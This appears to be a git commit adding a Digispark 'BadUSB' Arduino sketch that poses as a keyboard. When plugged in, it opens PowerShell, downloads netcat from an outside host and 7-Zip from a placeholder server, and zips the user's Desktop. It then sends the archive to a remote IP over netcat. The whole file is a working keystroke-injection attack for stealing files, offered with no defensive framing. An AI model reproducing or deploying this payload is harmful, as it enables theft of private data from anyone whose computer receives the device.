5a39e0fbfe33d0e7f3482cb2f1e9b41719ecc592
Doğukan Akbaş <80774965+dogukanakbas44@users.noreply.github.com>
2022-03-27 15:58:25 +0300

    Create digispark-badusb.ino

---
+++ digispark-badusb.ino
@@ -0,0 +1,51 @@
+#define kbd_tr_tr
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$WebClient.DownloadFile('http://tls.beyazhacker.com/nc64.exe','nc64.exe')");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.1(sunucu veya ip adresiniz)/7z.exe(indirilecek dosya adı)','7z.exe')");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.print("cmd.exe");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("7z.exe a fullDesktop ./Desktop/*");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.print("nc64.exe 192.168.1.104 8585 < fullDesktop.7z");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+  for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
